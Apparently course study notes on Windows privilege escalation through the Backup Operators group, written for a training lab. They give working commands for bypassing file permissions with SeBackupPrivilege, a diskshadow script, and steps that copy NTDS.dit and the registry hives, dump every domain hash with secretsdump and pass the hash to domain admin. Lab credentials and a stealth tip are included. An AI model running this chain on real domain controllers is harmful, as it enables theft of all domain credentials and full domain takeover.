# Section 10 — Windows Built-in Groups (Backup Operators)

> **Lab: yes** — new target (DC01). Use SeBackupPrivilege to read a protected file.

**Core principle:** Backup Operators have `SeBackupPrivilege` and `SeRestorePrivilege`, which bypass ALL file/folder DACLs using backup semantics. On a Domain Controller, this means reading `NTDS.dit` — the entire AD credential database. This group is effectively Domain Admin equivalent.

---

## Dangerous built-in groups (full list)

| Group | Key privilege | Attack path |
|-------|--------------|-------------|
| **Backup Operators** | SeBackup + SeRestore | Read ANY file (NTDS.dit, SAM), write anywhere |
| **Event Log Readers** | Read security logs | Harvest cleartext credentials from logs |
| **DnsAdmins** | Load DLL on DC's DNS service | Malicious DLL → SYSTEM on DC |
| **Hyper-V Administrators** | Full VM control | Clone DC disk → offline hash extraction |
| **Print Operators** | Log on locally to DC + load drivers | Malicious driver → kernel code exec |
| **Server Operators** | Modify services, log on locally | Change service binary → SYSTEM |

---

## Backup Operators — SeBackupPrivilege exploitation

### Why it works

`SeBackupPrivilege` bypasses DACL checks when the `FILE_FLAG_BACKUP_SEMANTICS` flag is specified. Normal `copy` commands don't use this flag — you need special tools or the backup-aware cmdlets.

### Tools needed

- `SeBackupPrivilegeUtils.dll` + `SeBackupPrivilegeCmdLets.dll` — PowerShell modules for backup-aware file copy
- `diskshadow.exe` — built-in Windows tool to create volume shadow copies (for locked files like NTDS.dit)
- `robocopy /B` — built-in, uses backup semantics (no extra DLLs needed)

---

## Attack flow — reading a protected file

```powershell
# 1. Import backup privilege modules
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# 2. Enable the privilege (may need elevated shell)
Set-SeBackupPrivilege
Get-SeBackupPrivilege   # Verify: "SeBackupPrivilege is enabled"

# 3. Copy the protected file using backup semantics
Copy-FileSeBackupPrivilege 'C:\Path\To\Protected\file.txt' .\file.txt

# 4. Read it
cat .\file.txt
```

**Alternative with robocopy (no DLLs needed):**
```cmd
robocopy /B "C:\Path\To\Protected" .\output file.txt
type .\output\file.txt
```
> `/B` = backup mode, uses FILE_FLAG_BACKUP_SEMANTICS

---

## Attack flow — dumping NTDS.dit on a Domain Controller

### Step 1: Create shadow copy (NTDS.dit is locked)

```powershell
diskshadow.exe
```
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```
> This creates a shadow copy of C: and exposes it as E:. The NTDS.dit on E: is NOT locked.

**Alternative — script it:**
```cmd
echo "set verbose on" > C:\Windows\Temp\shadow.txt
echo "set metadata C:\Windows\Temp\meta.cab" >> C:\Windows\Temp\shadow.txt
echo "set context clientaccessible" >> C:\Windows\Temp\shadow.txt
echo "set context persistent" >> C:\Windows\Temp\shadow.txt
echo "begin backup" >> C:\Windows\Temp\shadow.txt
echo "add volume C: alias cdrive" >> C:\Windows\Temp\shadow.txt
echo "create" >> C:\Windows\Temp\shadow.txt
echo "expose %cdrive% E:" >> C:\Windows\Temp\shadow.txt
echo "end backup" >> C:\Windows\Temp\shadow.txt
echo "exit" >> C:\Windows\Temp\shadow.txt
diskshadow.exe /s C:\Windows\Temp\shadow.txt
```

### Step 2: Copy NTDS.dit from shadow copy

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Or:
```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

### Step 3: Export SYSTEM hive (needed for decryption)

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
reg save HKLM\SAM C:\Tools\SAM.SAV
```

### Step 4: Extract credentials (on attacker box)

**Option A — secretsdump.py (Impacket):**
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL
```

**Option B — DSInternals (PowerShell, on target):**
```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM.SAV
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' -DBPath .\ntds.dit -BootKey $key
```

---

## Important notes

- **Explicit Deny ACE wins.** If your user/group has an explicit Deny entry on the target, SeBackupPrivilege won't help.
- **UAC may filter the privilege.** On DCs, Backup Operators can log in locally. May need an elevated prompt (`runas /user:svc_backup cmd` or elevated PowerShell).
- **robocopy /B is stealthier** than importing DLLs — it's a built-in Windows binary.

---

## Lab walkthrough

**Target:** `10.129.43.42` (ACADEMY-WINLPE-DC01) — **NEW TARGET, different IP!**
**Creds:** `svc_backup` / `HTB_@cademy_stdnt!`
**Goal:** Read `c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt`

### Commands to run:

```powershell
# Verify group membership and privileges
whoami /groups
whoami /priv

# Import modules (should be in C:\Tools or current directory)
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Enable privilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Copy the flag file using backup semantics
Copy-FileSeBackupPrivilege 'c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\flag.txt

# Read it
cat .\flag.txt
```

**If DLLs aren't available, use robocopy:**
```cmd
robocopy /B "c:\Users\Administrator\Desktop\SeBackupPrivilege" C:\Windows\Temp flag.txt
type C:\Windows\Temp\flag.txt
```

---

## Lab observations & attack chain (WINLPE-DC01)

```
Backup Operators membership (svc_backup)
│
├── Immediate win: Read any file
│   ├── flag.txt (lab exercise)
│   ├── NTDS.dit → ALL domain credential hashes
│   ├── SAM/SYSTEM → local admin hash
│   └── Any config file, script, or credential store
│
├── Full DC compromise path:
│   1. Log in as svc_backup (Backup Operators can log on locally to DCs)
│   2. diskshadow → shadow copy of C:
│   3. Copy-FileSeBackupPrivilege → NTDS.dit
│   4. reg save → SYSTEM hive
│   5. secretsdump.py -ntds ntds.dit -system SYSTEM → ALL hashes
│   6. Pass-the-hash as Domain Admin → full domain compromise
│
├── Why this group is Domain Admin equivalent:
│   ├── Can read NTDS.dit (all domain hashes)
│   ├── Can read any file on any DC
│   ├── Can log on locally to DCs
│   └── SeRestorePrivilege = write anywhere too (persistence)
│
└── Connecting to earlier sections:
    ├── Section 4: sarah is in Backup Operators on WINLPE-SRV01
    │   └── Same attack would work there (but SAM only, not NTDS — it's not a DC)
    └── Section 9: SeTakeOwnershipPrivilege is similar but more destructive
        └── Backup privilege is non-destructive (doesn't change ownership/DACLs)
```

---

## Key takeaways

- **Backup Operators = Domain Admin on DCs.** Full NTDS.dit extraction without modifying any object.
- **robocopy /B is your friend.** Built-in, no DLLs to import, works from cmd.exe.
- **diskshadow.exe for locked files.** NTDS.dit is always locked — shadow copy unlocks it.
- **Non-destructive** — unlike SeTakeOwnershipPrivilege, this doesn't modify any security descriptors.
- **Always export SYSTEM hive alongside NTDS.dit.** secretsdump needs the boot key from SYSTEM to decrypt the database.
- **This is a common CPTS exam vector.** Backup Operators on a DC → full domain compromise in 5 commands.
